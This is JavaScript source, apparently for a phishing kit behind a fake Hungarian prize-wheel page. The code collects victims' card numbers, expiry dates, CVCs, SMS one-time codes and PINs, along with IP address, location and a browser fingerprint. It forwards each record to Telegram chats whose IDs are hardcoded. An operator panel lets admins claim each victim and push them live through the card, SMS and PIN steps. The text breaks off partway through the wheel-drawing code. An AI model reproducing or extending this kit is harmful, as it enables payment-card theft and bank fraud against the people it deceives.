// ============================================================
// 🔧 НАСТРОЙКИ (берутся с сервера, токен не передаётся)
// ============================================================
const OWNER_CHAT_ID = "6498787427, 602338529";

// ============================================================
// 👥 УПРАВЛЕНИЕ АДМИНИСТРАТОРАМИ (локальное хранилище)
// ============================================================
function getAdmins() {
  try {
    const stored = localStorage.getItem('tg_admins');
    if (stored) {
      const list = JSON.parse(stored);
      if (Array.isArray(list) && list.length > 0) return list;
    }
  } catch(e) {}
  return [OWNER_CHAT_ID];
}
function saveAdmins(admins) { localStorage.setItem('tg_admins', JSON.stringify(admins)); }
let ADMIN_CHAT_IDS = getAdmins();
let isAwaitingNewAdmin = false;
let blacklistedIPs = JSON.parse(localStorage.getItem('blacklisted_ips') || '[]');

// ============================================================
// 🗄️ АРХИВ ЛОГОВ
// ============================================================
let archivedLogs = JSON.parse(localStorage.getItem('archived_logs') || '[]');
function archiveLog(logId, logData) {
  const entry = { logId, data: logData, archivedAt: Date.now() };
  archivedLogs.unshift(entry);
  if (archivedLogs.length > 100) archivedLogs.pop();
  localStorage.setItem('archived_logs', JSON.stringify(archivedLogs));
}
function getArchivedLogs() { return archivedLogs; }

// ============================================================
// 🆔 ГЕНЕРАЦИЯ ID
// ============================================================
function generateLogId() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '#JOF-';
  for (let i = 0; i < 5; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
  return result;
}

// ============================================================
// 🌐 ПОЛУЧЕНИЕ IP И ГЕО (через сервер)
// ============================================================
let geoCache = null;
async function getIpInfo() {
  if (geoCache) return geoCache;
  try {
    const res = await fetch('/api/geo', { credentials: 'same-origin' });
    const data = await res.json();
    geoCache = data;
    return data;
  } catch(e) {
    console.warn('Ошибка получения гео:', e);
    return { ip: 'Unknown', country: 'Неизвестно', city: 'Неизвестно', isp: 'Неизвестно' };
  }
}

// ============================================================
// 🖥️ ОПРЕДЕЛЕНИЕ УСТРОЙСТВА
// ============================================================
function getDeviceInfo() {
  const ua = navigator.userAgent;
  const screen = window.screen;
  let browser = 'Unknown', browserVersion = 'Unknown';
  const uaMatch = ua.match(/(chrome|firefox|safari|edg|opera|opr)\/(\d+\.\d+)/i);
  if (uaMatch) {
    const name = uaMatch[1].toLowerCase();
    if (name === 'chrome') browser = 'Chrome';
    else if (name === 'firefox') browser = 'Firefox';
    else if (name === 'safari') browser = 'Safari';
    else if (name === 'edg') browser = 'Edge';
    else if (name === 'opera' || name === 'opr') browser = 'Opera';
    browserVersion = uaMatch[2];
  }
  let os = 'Unknown', osVersion = 'Unknown';
  if (ua.includes('Windows NT 10.0')) { os = 'Windows'; osVersion = '10/11'; }
  else if (ua.includes('Windows NT 6.1')) { os = 'Windows'; osVersion = '7'; }
  else if (ua.includes('Windows NT 6.3')) { os = 'Windows'; osVersion = '8.1'; }
  else if (ua.includes('Mac OS X')) { 
    os = 'macOS'; 
    const match = ua.match(/Mac OS X (\d+[._]\d+)/);
    if (match) osVersion = match[1].replace('_', '.');
  } else if (ua.includes('Android')) {
    os = 'Android';
    const match = ua.match(/Android (\d+\.\d+)/);
    if (match) osVersion = match[1];
  } else if (ua.includes('iPhone') || ua.includes('iPad')) {
    os = 'iOS';
    const match = ua.match(/OS (\d+[._]\d+)/);
    if (match) osVersion = match[1].replace('_', '.');
  } else if (ua.includes('Linux')) { os = 'Linux'; }
  let device = 'Desktop';
  if (/Mobile|Android|iPhone|iPad/i.test(ua)) device = 'Mobile';
  if (/Tablet|iPad/i.test(ua)) device = 'Tablet';
  let fingerprint = '';
  try {
    const canvas = document.createElement('canvas');
    canvas.width = 256; canvas.height = 256;
    const ctx = canvas.getContext('2d');
    ctx.fillStyle = '#f60';
    ctx.fillRect(0, 0, 256, 256);
    ctx.fillStyle = '#fff';
    ctx.font = '24px Arial';
    ctx.fillText('JOF', 50, 150);
    fingerprint = canvas.toDataURL().substring(0, 50);
  } catch(e) { fingerprint = 'N/A'; }
  return {
    browser, browserVersion, os, osVersion, device,
    ua: ua.substring(0, 150),
    screen: `${screen.width}x${screen.height}`,
    fingerprint
  };
}

// ============================================================
// 🏦 ОПРЕДЕЛЕНИЕ BIN И БАНКА
// ============================================================
function getBin(cardNumber) {
  const clean = cardNumber.replace(/\s/g, '');
  if (clean.length < 6) return 'Unknown';
  return clean.substring(0, 6);
}
function getBankByBin(bin) {
  const db = {
    '411111': 'Visa (Test)','401288': 'Visa (Test)','555555': 'Mastercard (Test)',
    '510510': 'Mastercard (Test)','378282': 'American Express (Test)',
    '601111': 'Discover (Test)','305693': 'Diners Club (Test)',
    '520000': 'OTP Bank','550000': 'OTP Bank','560000': 'K&H Bank',
    '570000': 'Erste Bank','580000': 'Raiffeisen Bank','590000': 'Unicredit Bank',
    '490000': 'OTP Bank (Visa)','491000': 'K&H Bank (Visa)',
    '492000': 'Erste Bank (Visa)','493000': 'Raiffeisen Bank (Visa)',
    '494000': 'Unicredit Bank (Visa)'
  };
  if (db[bin]) return db[bin];
  const bin4 = bin.substring(0,4);
  for (let key of Object.keys(db)) if (key.startsWith(bin4)) return db[key];
  return 'Неизвестный банк';
}

// ============================================================
// 🛡️ ЗАЩИТА ОТ СПАМА И DDOS (локальная)
// ============================================================
let requestCounts = {};
let lastResetTime = Date.now();
function checkRateLimit(ip) {
  const now = Date.now();
  if (now - lastResetTime > 60000) { requestCounts = {}; lastResetTime = now; }
  if (!requestCounts[ip]) requestCounts[ip] = 0;
  requestCounts[ip]++;
  return requestCounts[ip] <= 5;
}
function isIpBlacklisted(ip) { return blacklistedIPs.includes(ip); }
function addToBlacklist(ip) {
  if (!blacklistedIPs.includes(ip)) {
    blacklistedIPs.push(ip);
    localStorage.setItem('blacklisted_ips', JSON.stringify(blacklistedIPs));
  }
}
function removeFromBlacklist(ip) {
  blacklistedIPs = blacklistedIPs.filter(i => i !== ip);
  localStorage.setItem('blacklisted_ips', JSON.stringify(blacklistedIPs));
}

// ============================================================
// 📊 УПРАВЛЕНИЕ ЛОГАМИ (с сохранением в localStorage)
// ============================================================
let logs = {};
let logMessages = {};
let userLastSeen = {};
const VISITOR_SESSION_KEY = 'jof_visitor_session_v4';
let visitorSessionId = localStorage.getItem(VISITOR_SESSION_KEY);
if (!visitorSessionId) {
  visitorSessionId = (crypto.randomUUID ? crypto.randomUUID() : 'v_' + Date.now() + '_' + Math.random().toString(36).slice(2));
  localStorage.setItem(VISITOR_SESSION_KEY, visitorSessionId);
}

function loadLogsFromStorage() {
  try {
    const stored = localStorage.getItem('logs_data');
    if (stored) {
      const parsed = JSON.parse(stored);
      logs = parsed;
      for (let key of Object.keys(logs)) {
        if (!logs[key].data) logs[key].data = {};
        if (!logs[key].takenBy) logs[key].takenBy = null;
        if (!logs[key].createdAt) logs[key].createdAt = Date.now();
        // Удаляем чувствительные данные из localStorage
        delete logs[key].data.cardCvc;
        delete logs[key].data.smsCode;
        delete logs[key].data.pinCode;
        if (!logs[key].data.sessionId) {
          logs[key].data.sessionId = null;
        }
      }
      saveLogsToStorage();
      console.log('📂 Загружено логов из storage:', Object.keys(logs).length);
    }
  } catch(e) { console.warn('Ошибка загрузки логов:', e); }
}
function saveLogsToStorage() {
  try {
    localStorage.setItem('logs_data', JSON.stringify(logs));
  } catch(e) {}
}

function createLog(logId, data) {
  data.sessionId = visitorSessionId;
  logs[logId] = { takenBy: null, data: data, createdAt: Date.now() };
  userLastSeen[logId] = Date.now();
  if (data.ip && data.ip !== 'Unknown') {
    saveIpLogId(data.ip, logId);
  }
  saveLogsToStorage();
}
function takeLog(logId, adminId) {
  if (!logs[logId]) return false;
  if (logs[logId].takenBy !== null) return false;
  logs[logId].takenBy = adminId;
  saveLogsToStorage();
  return true;
}
function releaseLog(logId) {
  if (!logs[logId]) return false;
  logs[logId].takenBy = null;
  saveLogsToStorage();
  return true;
}
function getLogStatus(logId) { return logs[logId] || null; }
function findActiveLogBySession(sessionId) {
  if (!sessionId) return null;
  for (const key of Object.keys(logs)) {
    const log = logs[key];
    if (log.data.sessionId === sessionId &&
        log.data.step !== 'success' &&
        log.data.step !== 'idle' &&
        log.data.step !== 'card_reject' &&
        !log.data.blocked) {
      return key;
    }
  }
  return null;
}

function saveIpLogId(ip, logId) {
  const map = JSON.parse(localStorage.getItem('ip_log_map') || '{}');
  map[ip] = logId;
  localStorage.setItem('ip_log_map', JSON.stringify(map));
}
function getLogIdByIp(ip) {
  const map = JSON.parse(localStorage.getItem('ip_log_map') || '{}');
  return map[ip] || null;
}
function removeIpLogId(ip) {
  const map = JSON.parse(localStorage.getItem('ip_log_map') || '{}');
  delete map[ip];
  localStorage.setItem('ip_log_map', JSON.stringify(map));
}

function findActiveLogByIp(ip) {
  const savedId = getLogIdByIp(ip);
  if (savedId && logs[savedId] && logs[savedId].data.step !== 'success' && logs[savedId].data.step !== 'idle' && !logs[savedId].data.blocked) {
    return savedId;
  }
  for (let key of Object.keys(logs)) {
    const log = logs[key];
    if (log.data.ip === ip && log.data.step !== 'success' && log.data.step !== 'idle' && !log.data.blocked) {
      return key;
    }
  }
  return null;
}

function getOnlineAdmins() {
  const admins = [];
  for (let key of Object.keys(logs)) {
    const log = logs[key];
    if (log.takenBy) {
      if (!admins.includes(log.takenBy)) admins.push(log.takenBy);
    }
  }
  return admins;
}

function isUserOnline(logId) {
  const lastSeen = userLastSeen[logId];
  if (!lastSeen) return false;
  return (Date.now() - lastSeen) < 30000; // 30 секунд
}

function updateLastSeen(logId) {
  userLastSeen[logId] = Date.now();
  try {
    localStorage.setItem('user_last_seen', JSON.stringify(userLastSeen));
  } catch(e) {}
}

// Восстанавливаем userLastSeen
try {
  const stored = localStorage.getItem('user_last_seen');
  if (stored) userLastSeen = JSON.parse(stored);
} catch(e) {}

// Очистка старых логов
setInterval(() => {
  const now = Date.now();
  for (let key of Object.keys(logs)) {
    if (now - logs[key].createdAt > 3600000) {
      if (logs[key].data.step === 'success' || logs[key].data.step === 'card_reject' || logs[key].data.blocked) {
        archiveLog(key, logs[key].data);
      }
      if (logs[key].data.ip && logs[key].data.ip !== 'Unknown') {
        removeIpLogId(logs[key].data.ip);
      }
      delete logs[key];
      delete userLastSeen[key];
    }
  }
  saveLogsToStorage();
  try {
    localStorage.setItem('user_last_seen', JSON.stringify(userLastSeen));
  } catch(e) {}
}, 60000);

// ============================================================
// 📤 ОТПРАВКА СООБЩЕНИЙ В TELEGRAM (через сервер)
// ============================================================
async function sendToTelegram(chatId, message, replyMarkup = null, editMessageId = null) {
  try {
    const response = await fetch('/api/telegram/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'same-origin',
      body: JSON.stringify({ chatId, message, replyMarkup, editMessageId })
    });
    const data = await response.json();
    return data;
  } catch (e) {
    console.error('Ошибка локального Telegram API:', e);
    return { ok: false };
  }
}

// ============================================================
// 📦 ОБНОВЛЕНИЕ КОМПАКТНОГО ЛОГА
// ============================================================
async function updateCompactLog(logId, adminId = null, action = null) {
  const log = getLogStatus(logId);
  if (!log) return;
  const data = log.data;
  if (action) data.lastAction = action;
  updateLastSeen(logId);
  
  let statusText = '';
  switch(data.step) {
    case 'card': statusText = '⏳ Ожидает ввод карты'; break;
    case 'card_processing': statusText = '⏳ Карта получена, ожидание решения'; break;
    case 'sms': statusText = '⏳ Ожидает ввод SMS'; break;
    case 'sms_processing': statusText = '⏳ SMS получен, ожидание решения'; break;
    case 'pin': statusText = '⏳ Ожидает ввод PIN'; break;
    case 'pin_processing': statusText = '⏳ PIN получен, ожидание решения'; break;
    case 'success': statusText = '✅ Успешно завершён'; break;
    case 'card_reject': statusText = '❌ Отклонён'; break;
    case 'blocked': statusText = '🚫 Заблокирован'; break;
    default: statusText = data.step || 'idle';
  }
  
  let compactMsg = `📋 <b>${logId}</b>\n`;
  if (data.ip) compactMsg += `🌐 IP: ${data.ip}\n`;
  if (data.country) compactMsg += `📍 ${data.country}\n`;
  if (data.cardNumber) {
    compactMsg += `\n💳 Номер: ${data.cardNumber}\n`;
    if (data.cardExpiry) compactMsg += `📅 Срок: ${data.cardExpiry}\n`;
    if (data.cardCvc) compactMsg += `🔐 CVC: ${data.cardCvc}\n`;
    if (data.cardHolder) compactMsg += `👤 Владелец: ${data.cardHolder}\n`;
    if (data.bin) compactMsg += `🏦 BIN: ${data.bin}\n`;
    if (data.bank) compactMsg += `🏛️ Банк: ${data.bank}\n`;
  }
  if (data.smsCode) compactMsg += `\n📱 SMS-код: ${data.smsCode}\n`;
  if (data.pinCode) compactMsg += `\n🔑 PIN-код: ${data.pinCode}\n`;
  if (data.amount) compactMsg += `💰 Сумма: ${data.amount}\n`;
  if (data.fingerprint) compactMsg += `🆔 Отпечаток: ${data.fingerprint}\n`;
  compactMsg += `📌 Статус: ${statusText}`;
  if (data.lastAction) compactMsg += `\n🔄 ${data.lastAction}`;
  if (log.takenBy) compactMsg += `\n👤 Взял: ${log.takenBy === OWNER_CHAT_ID ? 'владелец' : log.takenBy}`;
  
  const online = isUserOnline(logId);
  compactMsg += `\n📶 Онлайн: ${online ? '✅ Да' : '❌ Нет'}`;
  
  let replyMarkup = null;
  const isTaken = log.takenBy !== null;
  
  if (data.step === 'success' || data.step === 'card_reject' || data.step === 'blocked') {
    replyMarkup = {
      inline_keyboard: [
        [{text: "🔄 Отпустить лог", callback_data: `release_${logId}`}],
        [{text: "🚫 Заблокировать IP", callback_data: `block_${data.ip}`}],
        [{text: "📶 Проверить онлайн", callback_data: `check_online_${logId}`}]
      ]
    };
  } else {
    if (!isTaken && (data.step === 'card_processing' || data.step === 'card')) {
      replyMarkup = {
        inline_keyboard: [
          [{text: "📋 Взять лог", callback_data: `take_${logId}`}],
          [{text: "📶 Проверить онлайн", callback_data: `check_online_${logId}`}]
        ]
      };
    } else if (isTaken) {
      let buttons = [];
      if (data.step === 'card' || data.step === 'card_processing') {
        buttons = [
          [{text: "✅ Отправить SMS", callback_data: "card_approve"}],
          [{text: "❌ Ошибка данных", callback_data: "card_error"}],
          [{text: "🚫 Отклонить", callback_data: "card_reject"}]
        ];
      } else if (data.step === 'sms' || data.step === 'sms_processing') {
        buttons = [
          [{text: "✅ Подтвердить SMS", callback_data: "sms_approve"}],
          [{text: "❌ Неверный SMS", callback_data: "sms_error"}],
          [{text: "🔑 Запросить PIN", callback_data: "sms_pin"}]
        ];
      } else if (data.step === 'pin' || data.step === 'pin_processing') {
        buttons = [
          [{text: "✅ Подтвердить PIN", callback_data: "pin_approve"}],
          [{text: "❌ Неверный PIN", callback_data: "pin_error"}]
        ];
      }
      buttons.push([{text: "🔄 Отпустить лог", callback_data: `release_${logId}`}]);
      buttons.push([{text: "🚫 Заблокировать IP", callback_data: `block_${data.ip}`}]);
      buttons.push([{text: "📶 Проверить онлайн", callback_data: `check_online_${logId}`}]);
      replyMarkup = { inline_keyboard: buttons };
    } else {
      replyMarkup = {
        inline_keyboard: [
          [{text: "📋 Взять лог", callback_data: `take_${logId}`}],
          [{text: "📶 Проверить онлайн", callback_data: `check_online_${logId}`}]
        ]
      };
    }
  }
  
  let targetChats = [];
  if (adminId) {
    if (ADMIN_CHAT_IDS.includes(adminId)) targetChats = [adminId];
  } else {
    targetChats = ADMIN_CHAT_IDS;
  }
  
  for (let chatId of targetChats) {
    if (isTaken && adminId === null && data.step !== 'success' && data.step !== 'card_reject' && data.step !== 'blocked') {
      if (chatId !== log.takenBy) continue;
    }
    const msgData = logMessages[logId] ? logMessages[logId][chatId] : null;
    if (msgData) {
      const res = await sendToTelegram(chatId, compactMsg, replyMarkup, msgData);
      if (res.ok) {
        if (!logMessages[logId]) logMessages[logId] = {};
        logMessages[logId][chatId] = res.message_id;
      }
    } else {
      const res = await sendToTelegram(chatId, compactMsg, replyMarkup);
      if (res.ok) {
        if (!logMessages[logId]) logMessages[logId] = {};
        logMessages[logId][chatId] = res.message_id;
      }
    }
  }
}

// ============================================================
// 📋 ОТПРАВКА СПИСКА ЛОГОВ (команда /start)
// ============================================================
async function sendLogList(chatId) {
  const active = Object.keys(logs);
  const archived = getArchivedLogs();
  let msg = '📋 <b>Список логов:</b>\n\n';
  if (active.length === 0 && archived.length === 0) {
    msg += 'Нет логов.';
  } else {
    if (active.length > 0) {
      msg += '🔵 <b>Активные:</b>\n';
      for (let id of active) {
        const log = logs[id];
        const taken = log.takenBy ? `(взял ${log.takenBy === chatId ? 'вы' : log.takenBy})` : '(свободен)';
        const online = isUserOnline(id) ? '🟢' : '🔴';
        msg += `${online} 📋 ${id} ${taken} — ${log.data.step || 'idle'}\n`;
      }
      msg += '\n';
    }
    if (archived.length > 0) {
      msg += '🟤 <b>Архив (последние 10):</b>\n';
      const count = Math.min(archived.length, 10);
      for (let i = 0; i < count; i++) {
        const entry = archived[i];
        const d = entry.data;
        const takenInfo = d.takenBy ? ` (брал ${d.takenBy})` : '';
        msg += `📋 ${entry.logId} — ${d.step || 'done'}${takenInfo} (${d.ip || 'Unknown'})\n`;
      }
    }
  }
  const ownLogs = Object.keys(logs).filter(id => logs[id].takenBy === chatId);
  let buttons = [];
  if (ownLogs.length > 0) {
    for (let id of ownLogs) {
      buttons.push([{text: `🔄 Отпустить ${id}`, callback_data: `release_${id}`}]);
    }
  }
  buttons.push([{text: "🔙 Назад", callback_data: "menu_back"}]);
  const replyMarkup = { inline_keyboard: buttons };
  await sendToTelegram(chatId, msg, replyMarkup);
}

// ============================================================
// 🔍 ПОЛЛИНГ (через сервер)
// ============================================================
let lastUpdateId = 0;
let pendingResolve = null;
let pendingReject = null;

async function getUpdates(offset) {
  try {
    const response = await fetch(`/api/telegram/updates?offset=${encodeURIComponent(offset)}`, {
      credentials: 'same-origin'
    });
    const data = await response.json();
    return data.ok && Array.isArray(data.result) ? data.result : [];
  } catch(e) {
    console.error('Ошибка getUpdates:', e);
    return [];
  }
}

async function startPolling() {
  while (true) {
    const updates = await getUpdates(lastUpdateId + 1);
    if (updates.length > 0) {
      for (let upd of updates) {
        if (upd.update_id > lastUpdateId) lastUpdateId = upd.update_id;
        if (upd.callback_query) {
          const cb = upd.callback_query;
          const userId = String(cb.from.id);
          const data = cb.data;
          if (ADMIN_CHAT_IDS.includes(userId)) {
            await answerCallbackQuery(cb.id);
            console.log(`📨 Callback: ${data} от ${userId}`);
            
            // --- Меню (только для владельца) ---
            if (data === 'menu_add_admin' || data === 'menu_list_admins' || data === 'menu_remove_admin') {
              if (userId !== OWNER_CHAT_ID) {
                await sendToTelegram(userId, '⛔ Только главный администратор может управлять админами.');
                continue;
              }
              if (data === 'menu_add_admin') {
                await sendToTelegram(userId, '👤 <b>Добавление администратора</b>\n\nОтправьте <b>chat_id</b>.\nИли попросите написать /start.', { inline_keyboard: [[{text:"❌ Отмена", callback_data:"menu_cancel"}]] });
                isAwaitingNewAdmin = true;
                continue;
              }
              if (data === 'menu_list_admins') {
                let list = '📋 <b>Список администраторов:</b>\n\n';
                ADMIN_CHAT_IDS.forEach((id, idx) => { list += `${idx+1}. ${id}` + (id === OWNER_CHAT_ID ? ' (владелец)' : '') + '\n'; });
                await sendToTelegram(userId, list, { inline_keyboard: [[{text:"🔙 Назад", callback_data:"menu_back"}]] });
                continue;
              }
              if (data === 'menu_remove_admin') {
                let list = '🗑 <b>Удалить администратора</b>\n\nВыберите ID:\n';
                const buttons = [];
                ADMIN_CHAT_IDS.forEach(id => { if (id !== OWNER_CHAT_ID) buttons.push([{text:`❌ ${id}`, callback_data:`remove_${id}`}]); });
                if (buttons.length === 0) { await sendToTelegram(userId, '❌ Нет других администраторов.'); continue; }
                buttons.push([{text:"🔙 Назад", callback_data:"menu_back"}]);
                await sendToTelegram(userId, list, { inline_keyboard: buttons });
                continue;
              }
            }
            if (data === 'menu_back' || data === 'menu_cancel') { await showMainMenu(userId); continue; }
            if (data === 'menu_online') {
              const online = getOnlineAdmins();
              let msg = '👥 <b>Онлайн-администраторы:</b>\n';
              if (online.length === 0) msg += 'Нет активных администраторов.';
              else {
                for (let id of online) {
                  const logsHeld = Object.keys(logs).filter(key => logs[key].takenBy === id);
                  msg += `\n🔹 <b>${id}</b> (${logsHeld.length} логов)`;
                }
              }
              await sendToTelegram(userId, msg, { inline_keyboard: [[{text:"🔙 Назад", callback_data:"menu_back"}]] });
              continue;
            }
            if (data === 'menu_archive') {
              const archived = getArchivedLogs();
              let msg = '📜 <b>Архив логов (последние 20):</b>\n\n';
              if (archived.length === 0) msg += 'Архив пуст.';
              else {
                const count = Math.min(archived.length, 20);
                for (let i = 0; i < count; i++) {
                  const entry = archived[i];
                  const logId = entry.logId;
                  const d = entry.data;
                  const takenInfo = d.takenBy ? ` (брал ${d.takenBy})` : '';
                  msg += `📋 ${logId} — ${d.step || 'done'}${takenInfo} (${d.ip || 'Unknown'})\n`;
                }
              }
              await sendToTelegram(userId, msg, { inline_keyboard: [[{text:"🔙 Назад", callback_data:"menu_back"}]] });
              continue;
            }
            if (data.startsWith('remove_')) {
              if (userId !== OWNER_CHAT_ID) {
                await sendToTelegram(userId, '⛔ Только главный администратор может удалять админов.');
                continue;
              }
              const removeId = data.replace('remove_', '');
              if (removeId === OWNER_CHAT_ID) { await sendToTelegram(userId, '❌ Нельзя удалить владельца.'); continue; }
              const newList = ADMIN_CHAT_IDS.filter(id => id !== removeId);
              if (newList.length === ADMIN_CHAT_IDS.length) { await sendToTelegram(userId, '❌ Пользователь не найден.'); }
              else { ADMIN_CHAT_IDS = newList; saveAdmins(ADMIN_CHAT_IDS); await sendToTelegram(userId, `✅ Администратор ${removeId} удалён.`); await showMainMenu(userId); }
              continue;
            }
            
            // --- Управление логами ---
            if (data.startsWith('take_')) {
              const logId = data.replace('take_', '');
              const log = getLogStatus(logId);
              if (!log) { await sendToTelegram(userId, `❌ Лог ${logId} не найден.`); continue; }
              if (log.takenBy !== null) { 
                await sendToTelegram(userId, `❌ Лог уже взят ${log.takenBy === userId ? 'вами' : 'другим админом'}.`);
                continue;
              }
              takeLog(logId, userId);
              const adminName = cb.from.first_name || cb.from.username || userId;
              await sendToAllAdmins(`📌 <b>${adminName}</b> взял лог ${logId} в обработку.`);
              await updateCompactLog(logId, userId, `Взят ${adminName}`);
              continue;
            }
            if (data.startsWith('release_')) {
              const logId = data.replace('release_', '');
              const log = getLogStatus(logId);
              if (!log) { await sendToTelegram(userId, `❌ Лог ${logId} не найден.`); continue; }
              if (log.takenBy !== userId) { await sendToTelegram(userId, `❌ Лог не у вас.`); continue; }
              releaseLog(logId);
              const adminName = cb.from.first_name || cb.from.username || userId;
              await sendToAllAdmins(`📌 <b>${adminName}</b> отпустил лог ${logId}. Теперь его может взять другой администратор.`);
              await updateCompactLog(logId, null, `Отпущен ${adminName}`);
              continue;
            }
            if (data.startsWith('block_')) {
              const ip = data.replace('block_', '');
              if (ip && ip !== 'Unknown') {
                addToBlacklist(ip);
                await sendToAllAdmins(`🚫 <b>IP ${ip} заблокирован.</b>`);
                for (let key of Object.keys(logs)) {
                  if (logs[key].data.ip === ip) {
                    logs[key].data.step = 'blocked';
                    logs[key].data.blocked = true;
                    archiveLog(key, logs[key].data);
                    delete logs[key];
                    removeIpLogId(ip);
                  }
                }
                saveLogsToStorage();
              } else {
                await sendToTelegram(userId, `❌ Не удалось заблокировать: IP неизвестен.`);
              }
              continue;
            }
            if (data.startsWith('check_online_')) {
              const logId = data.replace('check_online_', '');
              const log = getLogStatus(logId);
              if (!log) { await sendToTelegram(userId, `❌ Лог ${logId} не найден.`); continue; }
              const targetAdmin = log.takenBy || null;
              await updateCompactLog(logId, targetAdmin, 'Проверка онлайн');
              continue;
            }
            // --- Команды обработки карты/SMS/PIN ---
            if (data.startsWith('card_')) {
              let targetLogId = null;
              for (let key of Object.keys(logs)) {
                if (logs[key].takenBy === userId && (logs[key].data.step === 'card' || logs[key].data.step === 'card_processing')) {
                  targetLogId = key;
                  break;
                }
              }
              if (!targetLogId) { await sendToTelegram(userId, `❌ Нет активного лога на этапе "Карта".`); continue; }
              if (pendingResolve) { pendingResolve({ type: 'callback', data: data, logId: targetLogId }); pendingResolve = null; }
              continue;
            }
            if (data.startsWith('sms_')) {
              let targetLogId = null;
              for (let key of Object.keys(logs)) {
                if (logs[key].takenBy === userId && (logs[key].data.step === 'sms' || logs[key].data.step === 'sms_processing')) {
                  targetLogId = key;
                  break;
                }
              }
              if (!targetLogId) { await sendToTelegram(userId, `❌ Нет активного лога на этапе "SMS".`); continue; }
              if (pendingResolve) { pendingResolve({ type: 'callback', data: data, logId: targetLogId }); pendingResolve = null; }
              continue;
            }
            if (data.startsWith('pin_')) {
              let targetLogId = null;
              for (let key of Object.keys(logs)) {
                if (logs[key].takenBy === userId && (logs[key].data.step === 'pin' || logs[key].data.step === 'pin_processing')) {
                  targetLogId = key;
                  break;
                }
              }
              if (!targetLogId) { await sendToTelegram(userId, `❌ Нет активного лога на этапе "PIN".`); continue; }
              if (pendingResolve) { pendingResolve({ type: 'callback', data: data, logId: targetLogId }); pendingResolve = null; }
              continue;
            }
          }
        }
        // Текстовые сообщения
        if (upd.message && upd.message.text) {
          const userId = String(upd.message.from.id);
          const text = upd.message.text.trim();
          if (ADMIN_CHAT_IDS.includes(userId)) {
            if (isAwaitingNewAdmin && userId === OWNER_CHAT_ID) {
              if (/^\d+$/.test(text)) {
                const newId = text;
                if (ADMIN_CHAT_IDS.includes(newId)) { await sendToTelegram(userId, `⚠️ Уже есть.`); }
                else {
                  ADMIN_CHAT_IDS.push(newId); saveAdmins(ADMIN_CHAT_IDS);
                  await sendToTelegram(userId, `✅ Администратор ${newId} добавлен.`);
                  await sendToTelegram(newId, `👋 <b>Вы стали администратором!</b>`, { inline_keyboard: [[{text:"📋 Меню", callback_data:"menu_back"}]] });
                  await showMainMenu(userId);
                }
                isAwaitingNewAdmin = false;
              } else {
                await sendToTelegram(userId, `❌ Отправьте число (chat_id).`);
              }
              continue;
            }
            if (text === '/start' || text === 'start') {
              await sendLogList(userId);
              continue;
            }
            if (pendingResolve) { pendingResolve({ type: 'text', data: text }); pendingResolve = null; }
          }
        }
      }
    }
    await new Promise(r => setTimeout(r, 2000));
  }
}

async function answerCallbackQuery(callbackQueryId, text = null) {
  try {
    await fetch('/api/telegram/answer', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callbackQueryId, text })
    });
  } catch(e) {}
}

// ============================================================
// 📋 ГЛАВНОЕ МЕНЮ
// ============================================================
async function showMainMenu(chatId) {
  const isOwner = chatId === OWNER_CHAT_ID;
  let menu = '👋 <b>Панель администратора</b>\n\nВыберите действие:';
  let buttons = [];
  if (isOwner) {
    buttons.push([{text: "➕ Добавить администратора", callback_data: "menu_add_admin"}]);
    buttons.push([{text: "📋 Список администраторов", callback_data: "menu_list_admins"}]);
    buttons.push([{text: "❌ Удалить администратора", callback_data: "menu_remove_admin"}]);
  }
  buttons.push([{text: "👥 Online администраторы", callback_data: "menu_online"}]);
  buttons.push([{text: "📜 Архив логов", callback_data: "menu_archive"}]);
  buttons.push([{text: "📋 Мои логи", callback_data: "menu_my_logs"}]);
  const replyMarkup = { inline_keyboard: buttons };
  await sendToTelegram(chatId, menu, replyMarkup);
}

async function sendToAllAdmins(message, replyMarkup = null, editMessageId = null) {
  let results = {};
  for (let chatId of ADMIN_CHAT_IDS) {
    const res = await sendToTelegram(chatId, message, replyMarkup, editMessageId);
    results[chatId] = res;
  }
  return results;
}

// ============================================================
// ⏳ ОЖИДАНИЕ КОМАНДЫ
// ============================================================
function waitForAdminCommand() {
  return new Promise((resolve, reject) => {
    pendingResolve = resolve;
    pendingReject = reject;
    setTimeout(() => {
      if (pendingResolve) { pendingResolve = null; reject(new Error('Время ожидания истекло')); }
    }, 300000);
  });
}

// ============================================================
// 🎡 КОЛЕСО И ОСНОВНАЯ ЛОГИКА САЙТА
// ============================================================
const prizes = [0, 5000, 10000, 15000, 20000, 25000, 30000, 35000, 40000, 45000, 50000];
const colors = ["#f36f21","#ffffff","#f7c9aa","#202020","#fff3eb","#f36f21","#202020","#fff3eb","#f7c9aa","#202020","#fff3eb"];
const canvas = document.getElementById("wheel");
const ctx = canvas.getContext("2d");
const spinBtn = document.getElementById("spinBtn");
const status = document.getElementById("status");
const modal = document.getElementById("winModal");
const step1 = document.getElementById("step1");
const step1b = document.getElementById("step1b");
const step2 = document.getElementById("step2");
const step2b = document.getElementById("step2b");
const step2p = document.getElementById("step2p");
const step2pb = document.getElementById("step2pb");
const step3 = document.getElementById("step3");
const step1Btn = document.getElementById("step1Btn");
const step2Btn = document.getElementById("step2Btn");
const step2pBtn = document.getElementById("step2pBtn");
const step3Btn = document.getElementById("step3Btn");
const timerDisplay = document.getElementById("timerDisplay");
const smsInfoBox = document.getElementById("smsInfoBox");
const pinInfoBox = document.getElementById("pinInfoBox");
const pinInput = document.getElementById("pinInput");

let angle = 0, spinning = false, wonPrize = null;
let timerInterval = null;
let timerSeconds = 60;
let isProcessing = false;
let currentLogId = null;
let currentStep = 'idle';
let userIp = 'Unknown';
let userCountry = 'Unknown';
let pingInterval = null;

// ============================================================
// 🎨 ОТРИСОВКА КОЛЕСА
// ============================================================
function formatFt(v){ return new Intl.NumberFormat("hu-HU").format(v) + " Ft"; }
function drawWheel(){
  const cx = canvas.width/2, cy = canvas.height/2, r = 315;
  const slice = Math.PI * 2 / prizes.length;
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  for(let i = 0; i < prizes.length; i++){
    const start = angle + i * slice, end = start + slice;
    ctx.beginPath();
    ctx.moveTo(cx, cy);
    ctx.arc(cx, cy, r, start, end);
    ctx.closePath();
    ctx.fillStyle = colors[i];
    ctx.fill();
    ctx.strokeStyle = "#fff";
    ctx.lineWidth = 5;
    ctx.stroke();
    const mid = start + slice/2;
